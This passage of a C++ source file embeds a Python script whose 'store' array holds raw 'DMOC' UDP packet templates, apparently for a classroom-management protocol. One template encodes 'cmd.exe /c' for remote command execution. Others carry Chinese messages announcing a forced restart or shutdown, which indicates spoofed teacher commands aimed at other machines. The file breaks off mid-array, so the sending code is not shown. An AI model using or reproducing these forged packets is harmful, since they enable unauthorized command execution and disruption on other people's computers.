#include "head\netcom.h"
#include "head\tool.h"
#include <cstdio>
#include <cstring>
#include <mutex>
#include <thread>
#include <windows.h>

#define debug printf

char python[][10005] = {
    "import sys",
    "import socket",
    "import random",
    "import argparse",
    "from re import compile",
    "from time import sleep",
    "from struct import pack",
    "from os import popen, system",
    "from multiprocessing import Pool",
    "",
    "store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, "
    "0xe7, 0x52, 0x40, 0x91,",
    "          0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, "
    "0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,",
    "          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],",
    "         [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, "
    "0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x64, 0x86, "
    "0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, "
    "0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, "
    "0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, "
    "0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, "
    "0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x63, 0x00, 0x20, 0x00,",
    "          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],",
    "         [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xbf, 0x40, 0x22, 0x4e, 0x57, "
    "0x2d, 0x3e, 0x4f, 0x9b, 0x6f, 0xc1, 0x8d, 0xe1, 0xeb, 0x4f, 0x62, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, "
    "0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x00, "
    "0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, "
    "0xcd, 0x91, 0x2f, 0x54, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,",
    "          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],",
    "         [0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x2a, 0x02, 0x00, 0x00, 0xc8, 0xe3, 0x97, 0xfd, 0xc0, "
    "0xb5, 0x9f, 0x45, 0x87, 0x72, 0x05, 0xbd, 0x4e, 0x46, 0xa8, 0x96, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, "
    "0x1d, 0x02, 0x00, 0x00, 0x1d, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, "
    "0x10, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x59, 0x65, 0x08, 0x5e, 0x06, 0x5c, "
    "0x73, 0x51, 0xed, 0x95, 0xa8, 0x60, 0x84, 0x76, 0xa1, 0x8b, 0x97, 0x7b, 0x3a, 0x67, 0x02, 0x30, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
    "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, "
